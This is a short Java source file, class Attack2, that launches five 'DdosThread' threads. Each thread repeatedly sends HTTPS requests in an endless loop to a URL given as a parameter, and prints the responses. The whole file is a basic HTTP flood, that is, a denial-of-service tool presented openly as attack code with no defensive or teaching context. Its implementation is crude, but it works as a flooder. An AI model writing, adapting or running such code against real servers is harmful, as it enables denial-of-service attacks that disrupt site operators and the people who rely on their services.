package qwestgroup.service;

import javax.net.ssl.HttpsURLConnection;
import java.net.URL;
import java.util.concurrent.atomic.AtomicBoolean;

public class Attack2 {

    public void main1(String title) throws Exception {
        System.out.println(title);
            for (int i = 0; i < 5; i++) {
                DdosThread thread = new DdosThread(title);
                thread.start();
            }
    }
    public static class DdosThread extends Thread {
        private AtomicBoolean running = new AtomicBoolean(true);
        private String title;

        public DdosThread(String title) {
            this.title = title;
        }

        @Override
        public void run() {
            while (running.get()) {
                try {
                    doInBackground();
                } catch (Exception e) {
                    System.out.println("Exception");
                }
            }
        }
        protected String doInBackground() {
            String answerHTTP;
            URL url;
            HttpsURLConnection urlConnection = null;
            String server = title;
            try {
                url = new URL(server);
                urlConnection = (HttpsURLConnection) url.openConnection();
                int responseCode = urlConnection.getResponseCode();
                if(responseCode == HttpsURLConnection.HTTP_OK){
                    answerHTTP = (urlConnection.getInputStream()).toString();
                    System.out.println(answerHTTP);
                }

            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                if (urlConnection != null) {
                    urlConnection.disconnect();
                }
            }
            return null;
        }
    }
}
